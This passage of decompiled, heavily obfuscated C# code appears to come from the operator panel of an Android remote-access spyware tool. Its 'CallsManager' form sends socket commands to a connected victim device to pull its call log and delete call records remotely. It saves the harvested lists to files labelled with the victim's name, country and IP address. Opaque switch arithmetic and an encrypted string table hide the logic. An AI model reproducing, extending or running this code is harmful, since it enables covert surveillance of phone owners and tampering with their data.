            uint num6;
            switch ((num6 = (uint) (2135230438 - (-~(num5 ^ (519073535 * -1109740383 ^ 966580146) + (~(-963961031 - 2104156448 + (1707915202 - -1270512320)) - -330918143 * ~~-1262428730) ^ -~(540904733 * 1094533710) ^ 1489112872) ^ 2079254788 + 162472668))) % 3U)
            {
              case 1:
                enumerator.Dispose();
                num4 = (int) num6 * -23479298 ^ 2137857028;
                continue;
              case 2:
                goto label_13;
              default:
                goto label_17;
            }
          }
        }
label_17:;
      }
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_6;
label_1:
      int num1 = 1507690175;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (2049591463 - --((num2 ^ (-993347201 * (-1967839843 * -1305328670) + -2104841235 * (221891362 - 867289444 ^ -201435610 - 1454086975)) * 252692003 ^ -(641996734 * -764903765) - 471633079 * (8519387 - -920450688) + -(-1608730497 ^ -1640255732 ^ 52634502)) * 1132011719))) % 5U)
        {
          case 0:
            num1 = (int) num3 * 742764887 ^ 1195115529;
            continue;
          case 1:
            this.Opacity += 0.1;
            num1 = (int) num3 * -481145338 ^ -1660740330;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_3;
          case 4:
            goto label_6;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_6:
      this.TOpacity.Enabled = false;
      num1 = -70748843;
      goto label_2;
    }

    private void CallsManager_Load(object sender, EventArgs e)
    {
      this.Icon = new Icon(Settings.res_Path + EXGuarder.\u00376587715);
      this.SpyStyle();
label_1:
      int num1 = -1763260811;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-((num1 - (170904683 - 1847000543 - ~-900893506 - (1819760443 + 1220788156 - -1460612983 * 138279744) ^ 1924572381 - 1122365819 + (-1531039953 ^ -1914145303) - (-541946140 - (-980797088 ^ -577718143)) ^ -60750919 - 257746038 + 822500416 * -2094487015 - 89806852 + -(-985781693 * 356216436 + 1635156756)) ^ -(1742329796 ^ ~1329903824 + (1833615175 - 1882247135))) * -1956482231 ^ --974187891 - --1635821750) ^ -114895227)) % 8U)
        {
          case 0:
            this.Text = ((ClipboardManager) this).Title;
            num1 = 383681986;
            continue;
          case 1:
            this.TOpacity.Interval = Settings.T_Interval;
            this.TOpacity.Enabled = true;
            num1 = (int) num2 * -1514112651 ^ 185439262;
            continue;
          case 2:
            this.SaveAsToolStripMenuItem.Visible = true;
            num1 = (int) num2 * -759525611 ^ 2086427987;
            continue;
          case 3:
            int num3 = Operators.CompareString(getIconFrmReg.SHFILEINFOW.SAVING_DATA, EXGuarder.\u00317304A66, false) != 0 ? -1142774738 : (num3 = -1543520829);
            num1 = num3 ^ (int) num2 * 1214454613;
            continue;
          case 4:
            this.DGV0.ColumnHeadersDefaultCellStyle.Font = Settings.f;
            this.DGV0.DefaultCellStyle.Font = Settings.f;
            num1 = (int) num2 * 1472935060 ^ 427875112;
            continue;
          case 5:
            goto label_1;
          case 7:
            this.SaveToolStripMenuItem.Visible = true;
            num1 = (int) num2 * 875653712 ^ -885272345;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      ((Color_Box0) this).BoxTitlePaintEventArgsWait = true;
    }

    private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = 1798031092;
      int index;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(~~(num1 * 1448477917) + ~(-1972878622 - 1432118785)) - -1012018874)) % 8U)
        {
          case 0:
            str = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Tag);
            int num3;
            num1 = num3 = ((ClipboardManager) this).classClient == null ? -1619486381 : (num3 = 779109973);
            continue;
          case 1:
            this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[index].Index);
            num1 = (int) num2 * -1541346703 ^ 579134866;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((ClipboardManager) this).classClient.SendMessage(new object[4]
            {
              (object) ((ClipboardManager) this).Client,
              (object) (Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u003381B070D + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0035A266756 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003590B1A06 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + str),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0033F41186E),
              (object) ((ClipboardManager) this).classClient
            });
            num1 = (int) num2 * -780067642 ^ 1375117070;
            continue;
          case 3:
            goto label_1;
          case 4:
            checked { index += -1; }
            num1 = -1335482543;
            continue;
          case 5:
            goto label_10;
          case 6:
            int num4;
            num1 = num4 = index >= 0 ? 652556303 : (num4 = 882169470);
            continue;
          case 7:
            index = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num2 * -11282582 ^ -1840940009;
            continue;
          default:
            goto label_11;
        }
      }
label_10:
      return;
label_11:;
    }

    private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((ClipboardManager) this).classClient == null)
        return;
label_1:
      int num1 = 1514486054;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -((num1 * -218672773 - (1508832463 * 1955946485 ^ 690216262) - ((1351875091 ^ -805955315) - (72181780 - 1574072196) - 1512449042)) * 74471111)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((ClipboardManager) this).classClient.SendMessage(new object[4]
            {
              (object) ((ClipboardManager) this).Client,
              (object) (Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00319392C77 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00349351304 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.getCalls + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031337605A),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0035B1A6B2C),
              (object) ((ClipboardManager) this).classClient
            });
            num1 = (int) num2 * -410555867 ^ -1969475771;
            continue;
          case 2:
            goto label_5;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
      saveFileDialog.FileName = DateAndTime.Now.ToString(EXGuarder.\u0032C2C2841) + EXGuarder.\u00323252C41;
label_1:
      int num1 = 1270716185;
      while (true)
      {
        uint num2;
        WaitCallback callBack;
        switch ((num2 = (uint) (~-((num1 - (1686512695 + ~-13029999 - ~~(-1342469435 * 459159754) - (-1417567978 - -(1877595247 - 704787762) ^ ~(-45097662 - -562835045) + 2135506866))) * -667809325) * 1834787013 * -2112342623)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            int num3 = saveFileDialog.ShowDialog() != DialogResult.OK ? -1100003795 : (num3 = -498445476);
            num1 = num3 ^ (int) num2 * 2038823037;
            continue;
          case 2:
            if (Color_Box0.\u0024IR77\u002D1 != null)
            {
              num1 = (int) num2 * 1987047509 ^ -1559928036;
              continue;
            }
            // ISSUE: reference to a compiler-generated method
            Color_Box0.\u0024IR77\u002D1 = callBack = new WaitCallback(Color_Box0.\u0024I._Lambda\u0024__R77\u002D1);
            break;
          case 4:
            saveFileDialog.Filter = EXGuarder.\u0033F47335E;
            num1 = (int) num2 * -274368694 ^ 569134450;
            continue;
          case 5:
            callBack = Color_Box0.\u0024IR77\u002D1;
            break;
          default:
            goto label_10;
        }
        ThreadPool.QueueUserWorkItem(callBack, (object) new object[8]
        {
          (object) this.DGV0,
          (object) EXGuarder.\u0030A747863,
          (object) saveFileDialog.FileName,
          (object) ((ClipboardManager) this).tmpClientName,
          (object) (((ClipboardManager) this).tmpCountry + EXGuarder.\u00327096353 + ((ClipboardManager) this).tmpAddressIP),
          (object) EXGuarder.\u00378173746,
          (object) EXGuarder.\u0037204144D,
          (object) EXGuarder.\u0030A747863
        });
        num1 = -1578995726;
      }
label_10:
      saveFileDialog.Dispose();
    }

    private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
    {
      reso.Directory_Exist(((ClipboardManager) this).classClient);
label_1:
      int num1 = -1745054893;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~~~(num1 * 967325507) * -178459803 ^ -940526016)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            if (Color_Box0.\u0024IR78\u002D2 != null)
            {
              num1 = (int) num2 * -2027629178 ^ 984736361;
              continue;
            }
            goto label_6;
          default:
            goto label_5;
        }
      }
label_5:
      WaitCallback callBack = Color_Box0.\u0024IR78\u002D2;
      goto label_7;
label_6:
      // ISSUE: reference to a compiler-generated method
      callBack = Color_Box0.\u0024IR78\u002D2 = new WaitCallback(Color_Box0.\u0024I._Lambda\u0024__R78\u002D2);
label_7:
      object[] state = new object[8]
      {
        (object) this.DGV0,
        (object) ((ClipboardManager) this).tmpFolderUSER,
        (object) EXGuarder.\u00326731767,
        (object) ((ClipboardManager) this).tmpClientName,
        (object) (((ClipboardManager) this).tmpCountry + EXGuarder.\u00327266823 + ((ClipboardManager) this).tmpAddressIP),
        (object) EXGuarder.\u00315416670,
        (object) EXGuarder.\u00348676C76,
        (object) (DateAndTime.Now.ToString(EXGuarder.\u003703E2929) + EXGuarder.\u00316187653)
      };
      ThreadPool.QueueUserWorkItem(callBack, (object) state);
    }

    private void BoxTitle_Paint(object sender, PaintEventArgs e)
    {
      if (!((Color_Box0) this).BoxTitlePaintEventArgsWait)
        return;
label_1:
      int num1 = -1631220894;
      Size size1;
      string str1;
      string str2;
      Brush brush1;
      Brush brush2;
      Size size2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(-num1 ^ ((1269695054 - 463710196) * -2076601765 ^ -(-507735769 - -2019359574)) + ~(166559052 ^ 1719110155 * -1023799673)) * -1030333645 * -1635377061 ^ -543590691)) % 9U)
        {
          case 0:
            Rectangle rect = new Rectangle(0, 2, this.BoxTitle.Width, checked (size2.Height + 5));
            e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
            e.Graphics.DrawString(str1 + Strings.Space(10) + str2 + Strings.Space(10), Settings.f, brush1, 0.0f, 2f);
            num1 = (int) num2 * 1579963575 ^ -1735358522;
            continue;
          case 1:
            brush1 = (Brush) new SolidBrush(getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground);
            brush2 = (Brush) new SolidBrush(Color.FromArgb(170, (int) this.BoxTitle.BackColor.R, (int) this.BoxTitle.BackColor.G, (int) this.BoxTitle.BackColor.B));
            size2 = TextRenderer.MeasureText(str1 + Strings.Space(10) + str2, Settings.f);
            num1 = (int) num2 * -1224800261 ^ 359673827;
            continue;
          case 2:
            int count = this.DGV0.Rows.Count;
            str1 = EXGuarder.\u003212C6466 + Conversions.ToString(count);
            str2 = EXGuarder.\u0031B1A0B59 + Conversions.ToString(this.DGV0.SelectedRows.Count);
            num1 = (int) num2 * 879113603 ^ -2098328890;
            continue;
          case 3:
            size1 = TextRenderer.MeasureText(EXGuarder.\u003062F353B, Settings.f);
            num1 = (int) num2 * -1185834197 ^ 1285344561;
            continue;
          case 4:
            goto label_11;
          case 5:
            Color defaultColorForeground = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
            e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int) defaultColorForeground.R, (int) defaultColorForeground.G, (int) defaultColorForeground.B)), 0, 1, this.BoxTitle.Width, 1);
            num1 = (int) num2 * 809750493 ^ 401144116;
            continue;
          case 6:
            int num3 = this.BoxTitle.Height == checked (size1.Height + 3) ? -123118896 : (num3 = 2124112533);
            num1 = num3 ^ (int) num2 * -1647313648;
            continue;
          case 7:
            goto label_1;
          case 8:
            this.BoxTitle.Height = checked (size1.Height + 3);
            num1 = (int) num2 * 1784999848 ^ -1449249704;
            continue;
          default:
            goto label_12;
        }
      }
label_11:
      return;
label_12:;
    }

    private void AngelAndroidForm_Activated(object sender, EventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void BoxTitle_Resize(object sender, EventArgs e) => this.BoxTitle.Invalidate();

    private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void DGV0_SelectionChanged(object sender, EventArgs e) => this.BoxTitle.Invalidate();

    static CallsManager()
    {
      Color_Box0.\u0024I = (CallsManager._Closure\u0024__) new CallsManager();
    }
  }
}
